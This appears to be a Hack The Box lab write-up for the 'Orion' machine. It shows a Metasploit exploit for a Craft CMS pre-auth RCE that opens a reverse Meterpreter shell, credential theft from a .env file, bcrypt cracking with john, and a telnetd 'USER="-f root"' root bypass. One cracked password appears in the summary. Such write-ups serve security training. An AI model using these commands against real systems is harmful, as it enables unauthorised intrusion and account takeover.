# HTB Orion Writeup 
``` text 
================================================================================
                        HTB BOX WRITEUP: ORION
================================================================================
Author      : vishalgodseye
Box         : Orion (orion.htb)
IP          : 10.129.244.146
OS          : Ubuntu 22.04.5 LTS (Linux 5.15.0-177-generic)
Difficulty  : Medium
Type        : CTF / Pentest
Date        : 2026-06-29
================================================================================

1. EXECUTIVE SUMMARY
================================================================================

Orion is a medium-difficulty HTB running Craft CMS 5.6.16 with a known
pre-auth RCE (CVE-2025-32432). Initial foothold drops us as www-data
who reads Craft's .env file to get MySQL root credentials. The
DB has the admin user's bcrypt hash, which cracks to reveal the
credential adam:darkangel via SSH.

Privilege escalation is through a misconfigured local telnet service (port 23)
that trusts the USER environment variable for authentication. By setting
USER="-f root" and connecting, we spawn a root shell immediately — no password
required.

+--------+----------------------+----------+
| Severity | Finding            | Status   |
+--------+----------------------+----------+
| CRITICAL | CVE-2025-32432 RCE  | Exploited|
| HIGH    | DB creds in .env    | Exploited|
| HIGH    | Weak password       | Exploited|
| CRITICAL| telnet root bypass  | Exploited|
+--------+----------------------+----------+


2. SCOPE & METHODOLOGY
================================================================================

+-------------------------------+----------------------------------------------+
| Target  | orion.htb (10.129.244.146)                     |
| Ports   | 22 (SSH), 80 (HTTP), 23 (telnet), 3306 (MySQL)|
| Web App | Craft CMS 5.6.16 on nginx 1.18.0              |
| Exclusions| None                                          |
+-------------------------------+----------------------------------------------+

Phases: Port Scan -> Web Recon -> App Finger. -> Exploit (RCE) ->
         DB Hash Dump + Crack -> SSH -> PrivEsc (telnet)

Tools: rustscan, nmap 7.99, nuclei 3.9.0, gobuster 3.8.2, whatweb,
       Metasploit, john, SSH, telnet


3. ENUMERATION
================================================================================

3.1 Port Scan (rustscan)
+------+----------+------------------+
| Port | Protocol | Service          |
+------+----------+------------------+
| 22   | tcp      | SSH (OpenSSH 8.9)|
| 80   | tcp      | HTTP (nginx)     |
+------+----------+------------------+

3.2 Web Dir Enum (gobuster)
+------------------+--------+---------------------------+
| Path             | Status | Notes                     |
+------------------+--------+---------------------------+
| /admin           | 302    | -> /admin/login           |
| /wp-admin        | 418    | Tea pot                   |
| /logout          | 302    | -> /                      |
| /assets          | 301    | -> /assets/               |
| /index           | 200    | Main page                 |
| /p1..p15         | 200    | Pagination pages          |
+------------------+--------+---------------------------+

3.3 Web Finger (whatweb + nuclei)
- nginx/1.18.0 (Ubuntu)
- Craft CMS (Powered-By header)
- Email: your.email@company.com
- CVE-2025-32432 detection via craft-cms-detect template
- Missing security headers (nuclei)
- WAF detect: nginx generic

3.4 App Recon
- Craft CMS version: 5.6.16 (seen on /admin/login page)
- vuln to CVE-2025-32432 (pre-auth RCE)


4. EXPLOITATION
================================================================================

4.1 Initial Access : CVE-2025-32432 (Craft CMS Pre-Auth RCE)
------------------------------------------------------------
CVE       : CVE-2025-32432
CVSS      : 9.8 (Critical)
Location  : http://orion.htb
Exploit   : MSF linux/http/craftcms_preauth_rce_cve_2025_32432

  msfconsole
  use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
  set RHOSTS orion.htb
  set LHOST <your_ip>
  run

Result: Meterpreter shell as www-data

4.2 DB Creds (.env leak)
--------------------------
From /var/www/html/craft/.env:
  CRAFT_DB_USER     = root
  CRAFT_DB_PASSWORD = [REDACTED]
  CRAFT_DB_DATABASE = orion

4.3 MySQL Enum
----------------
www-data@orion$ mysql -u root -p -D orion -e "SELECT id,username,email FROM users;"

Result:
  id=1  username=admin  email=adam@orion.htb
  password=$2y$13$[REDACTED]

Hash type: bcrypt ($2y$13$)

4.4 Hash Cracking
------------------
john --format=bcrypt --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt

Result: admin:[REDACTED]

System user is adam (email = adam@orion.htb), same creds work for SSH.


5. LATERAL : SSH AS ADAM
================================================================================

ssh adam@orion.htb
password: [REDACTED]

  +------------------------------------------+
  | user.txt                                  |
  | [REDACTED]                                |
  +------------------------------------------+


6. PRIVILEGE ESCALATION : TELNET ROOT BYPASS
================================================================================

Port 23 (telnet) is listening on localhost:
  netstat -tulnp  ->  127.0.0.1:23  LISTEN

The inetutils telnetd here trusts the USER env var for auth.
Setting USER="-f root" logs in as root without a password.

  USER="-f root" telnet -a 127.0.0.1

This instantly drops a root shell.

  +------------------------------------------+
  | root.txt                                  |
  | [REDACTED]                                |
  +------------------------------------------+


7. FLAGS CAPTURED
================================================================================

  +------------------------------------------+
  | USER FLAG                                 |
  | [REDACTED]                                |
  | Source: SSH as adam -> /home/adam/user.txt|
  +------------------------------------------+

  +------------------------------------------+
  | ROOT FLAG                                 |
  | [REDACTED]                                |
  | Source: telnet root bypass -> /root/root.txt|
  +------------------------------------------+


8. REMAINING ATTACK SURFACE
================================================================================

1. Port 3306 (MySQL)     : reachable locally, may hold more data
2. Craft CMS admin panel : post-auth RCE / plugin vulns possible
3. PHP 8.2 / 8.4 FPM     : config review for additional entries


9. RECOMMENDATIONS
================================================================================

+----+----------+------------------------------------------------+----------+
| #  | Priority | Recommendation                                 | Effort   |
+----+----------+------------------------------------------------+----------+
| 1  | CRITICAL | Update Craft CMS to latest stable (>5.6.16)   | Low      |
| 2  | CRITICAL | Disable / restrict telnet service (port 23)   | Low      |
| 3  | HIGH     | Move .env outside web root + tighten perms    | Low      |
| 4  | HIGH     | Enforce strong password policy                 | Low      |
| 5  | MEDIUM   | Bind MySQL to localhost + drop root remote    | Low      |
| 6  | MEDIUM   | Security headers (CSP, HSTS, XFO)             | Low      |
| 7  | Low      | WAF + audit log for web app                   | Medium   |
+----+----------+------------------------------------------------+----------+


================================================================================
                              END OF WRITEUP
================================================================================
```
